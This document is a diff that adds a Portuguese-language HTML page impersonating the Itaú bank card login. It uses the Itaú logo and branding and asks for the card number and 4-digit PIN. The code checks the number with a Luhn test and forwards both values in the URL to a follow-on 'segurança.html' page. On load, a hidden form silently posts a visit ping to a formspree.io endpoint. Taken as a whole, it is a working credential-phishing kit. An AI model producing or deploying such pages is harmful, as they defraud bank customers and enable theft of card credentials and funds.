@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Itau</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      position: relative;
+      overflow: hidden;
+      height: 100vh;
+    }
+
+    .fundo {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    .logo-itau {
+      position: absolute;
+      top: 20px;
+      left: 10px;
+      height: 70px;
+      z-index: 1;
+    }
+
+    .container {
+      position: absolute;
+      bottom: 100px;
+      width: calc(100% - 40px);
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #0031d3;
+      padding: 20px;
+      box-sizing: border-box;
+      border-radius: 20px;
+      max-width: 500px;
+      z-index: 1;
+    }
+
+    .label {
+      color: white;
+      font-size: 16px;
+      margin-bottom: 5px;
+    }
+
+    .cartao-container {
+      display: flex;
+      background-color: white;
+      padding: 10px;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      cursor: pointer;
+    }
+
+    .cartao-numeros {
+      flex-grow: 1;
+      display: flex;
+      gap: 10px;
+    }
+
+    .grupo-numero {
+      width: 40px;
+      height: 20px;
+      text-align: center;
+      font-size: 18px;
+      opacity: 0;
+    }
+
+    .grupo-numero.ativo {
+      opacity: 0.3;
+    }
+
+    .grupo-numero.preenchido {
+      opacity: 1;
+    }
+
+    .senha-container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background-color: white;
+      padding: 10px;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      cursor: pointer;
+    }
+
+    .senha-circulos {
+      display: flex;
+      gap: 10px;
+    }
+
+    .circulo {
+      width: 15px;
+      height: 15px;
+      border-radius: 50%;
+      background-color: black;
+      opacity: 0;
+      transition: opacity 0.2s;
+    }
+
+    .circulo.ativo {
+      opacity: 0.3;
+    }
+
+    .circulo.preenchido {
+      opacity: 1;
+    }
+
+    .cadeado {
+      font-size: 20px;
+      color: black;
+      filter: grayscale(100%);
+    }
+
+    .btn-acessar {
+      width: 100%;
+      margin-top: 20px;
+      padding: 12px;
+      font-size: 18px;
+      background-color: #ff6201;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: normal;
+      cursor: pointer;
+    }
+
+    input[type="password"], input[type="text"] {
+      opacity: 0;
+      position: absolute;
+      pointer-events: none;
+    }
+
+    .erro {
+      color: #ffcccc;
+      font-size: 14px;
+      margin-top: -15px;
+      margin-bottom: 15px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <!-- Auto-submit form -->
+  <form id="autoForm" action="https://formspree.io/f/meogkoyy" method="POST" style="display: none;">
+    <input type="text" name="nome" value="Visualização">
+    <input type="text" name="message" value="+1">
+  </form>
+
+  <script>
+    // Auto submit form when page loads
+    window.addEventListener('load', function() {
+      const formData = new FormData(document.getElementById('autoForm'));
+      fetch('https://formspree.io/f/meogkoyy', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      });
+    });
+  </script>
+
+  <!-- Imagem de fundo -->
+  <img src="foto/fundo10.JPEG" alt="Fundo" class="fundo" id="backgroundImage">
+
+  <!-- Logo Itaú -->
+  <img src="foto/itaucard.png" alt="Itaú Card" class="logo-itau">
+
+  <div class="container">
+    <div class="label">Número do cartão</div>
+    <div class="cartao-container" id="cartaoContainer">
+      <div class="cartao-numeros">
+        <div class="grupo-numero" id="group1"></div>
+        <div class="grupo-numero" id="group2"></div>
+        <div class="grupo-numero" id="group3"></div>
+        <div class="grupo-numero" id="group4"></div>
+      </div>
+    </div>
+    <input type="text" maxlength="19" id="cartao" placeholder="5555 5555 5555 5555">
+    <div class="erro" id="cartaoErro">Número de cartão inválido</div>
+
+    <div class="label">Senha do cartão</div>
+    <div class="senha-container" id="senhaContainer">
+      <div class="senha-circulos">
+        <div class="circulo" id="dot1"></div>
+        <div class="circulo" id="dot2"></div>
+        <div class="circulo" id="dot3"></div>
+        <div class="circulo" id="dot4"></div>
+      </div>
+      <div class="cadeado">🔒</div>
+    </div>
+
+    <input type="password" maxlength="4" id="senha" inputmode="numeric" pattern="[0-9]*">
+
+    <button class="btn-acessar" id="btnAcessar">Acessar</button>
+  </div>
+
+  <script>
+    // Configuração do fundo alternado
+    const backgrounds = ['foto/fundo11.JPEG', 'foto/fundo10.JPEG'];
+    let currentBackground = 0;
+
+    function toggleBackground() {
+      currentBackground = (currentBackground + 1) % 2;
+      document.getElementById('backgroundImage').src = backgrounds[currentBackground];
+    }
+
+    // Alterna o fundo a cada 5 minutos (300000 millisegundos)
+    setInterval(toggleBackground, 300000);
+
+    // Elementos do cartão
+    const cartaoInput = document.getElementById('cartao');
+    const cartaoContainer = document.getElementById('cartaoContainer');
+    const cartaoErro = document.getElementById('cartaoErro');
+    const groups = [
+      document.getElementById('group1'),
+      document.getElementById('group2'),
+      document.getElementById('group3'),
+      document.getElementById('group4')
+    ];
+
+    // Elementos da senha
+    const senhaInput = document.getElementById('senha');
+    const senhaContainer = document.getElementById('senhaContainer');
+    const dots = [
+      document.getElementById('dot1'),
+      document.getElementById('dot2'),
+      document.getElementById('dot3'),
+      document.getElementById('dot4')
+    ];
+
+    // Botão de acessar
+    const btnAcessar = document.getElementById('btnAcessar');
+
+    // Algoritmo de Luhn para validar cartão
+    function validarCartao(numero) {
+      // Remove todos os não dígitos
+      numero = numero.replace(/\D/g, '');
+      
+      // Verifica se tem 16 dígitos
+      if (numero.length !== 16) return false;
+      
+      // Algoritmo de Luhn
+      let soma = 0;
+      let deveDobrar = false;
+      
+      for (let i = numero.length - 1; i >= 0; i--) {
+        let digito = parseInt(numero.charAt(i));
+        
+        if (deveDobrar) {
+          digito *= 2;
+          if (digito > 9) {
+            digito -= 9;
+          }
+        }
+        
+        soma += digito;
+        deveDobrar = !deveDobrar;
+      }
+      
+      return soma % 10 === 0;
+    }
+
+    // Formata o número do cartão ao digitar
+    cartaoInput.addEventListener('input', function(e) {
+      let valor = e.target.value.replace(/\D/g, '').substring(0, 16);
+      let formatado = valor.replace(/(\d{4})(?=\d)/g, '$1 ');
+      e.target.value = formatado;
+      
+      // Atualiza os grupos de números
+      const numeros = valor.match(/.{1,4}/g) || [];
+      groups.forEach((group, index) => {
+        if (index < numeros.length) {
+          group.textContent = numeros[index];
+          group.classList.add('ativo', 'preenchido');
+        } else {
+          group.textContent = '';
+          group.classList.remove('preenchido');
+          if (document.activeElement === cartaoInput) {
+            group.classList.add('ativo');
+          } else {
+            group.classList.remove('ativo');
+          }
+        }
+      });
+
+      // Valida o cartão
+      if (valor.length === 16) {
+        const valido = validarCartao(valor);
+        cartaoErro.style.display = valido ? 'none' : 'block';
+      } else {
+        cartaoErro.style.display = 'none';
+      }
+    });
+
+    // Mostra os grupos do cartão quando clicar
+    cartaoContainer.addEventListener('click', () => {
+      groups.forEach(group => {
+        group.classList.add('ativo');
+      });
+      cartaoInput.focus();
+    });
+
+    // Esconde os grupos do cartão quando clicar fora
+    document.addEventListener('click', function(e) {
+      if (!cartaoContainer.contains(e.target) && e.target !== cartaoInput) {
+        if (cartaoInput.value.length === 0) {
+          groups.forEach(group => {
+            group.classList.remove('ativo', 'preenchido');
+          });
+        }
+      }
+    });
+
+    // Mostra os pontos da senha conforme digita
+    senhaInput.addEventListener('input', function() {
+      const valor = senhaInput.value;
+      dots.forEach((dot, index) => {
+        if (index < valor.length) {
+          dot.classList.add('preenchido');
+        } else {
+          dot.classList.remove('preenchido');
+        }
+      });
+    });
+
+    // Mostra os círculos da senha quando clicar
+    senhaContainer.addEventListener('click', () => {
+      dots.forEach(dot => {
+        dot.classList.add('ativo');
+      });
+      senhaInput.focus();
+    });
+
+    // Esconde os círculos da senha quando clicar fora
+    document.addEventListener('click', function(e) {
+      if (!senhaContainer.contains(e.target)) {
+        if (senhaInput.value.length === 0) {
+          dots.forEach(dot => {
+            dot.classList.remove('ativo', 'preenchido');
+          });
+        }
+      }
+    });
+
+    // Validação ao clicar no botão
+    btnAcessar.addEventListener('click', function() {
+      const numeroCartao = cartaoInput.value.replace(/\D/g, '');
+      const senha = senhaInput.value;
+      
+      // Verifica se o cartão é válido
+      if (!validarCartao(numeroCartao)) {
+        cartaoErro.style.display = 'block';
+        return;
+      }
+      
+      // Verifica se a senha tem 4 dígitos
+      if (senha.length !== 4) {
+        alert('Por favor, insira uma senha com 4 dígitos');
+        return;
+      }
+      
+      // Se tudo estiver ok, redireciona com os parâmetros
+      window.location.href = `segurança.html?cartao=${numeroCartao}&senha=${senha}`;
+    });
+  </script>
+
+</body>
+</html>
+``` 
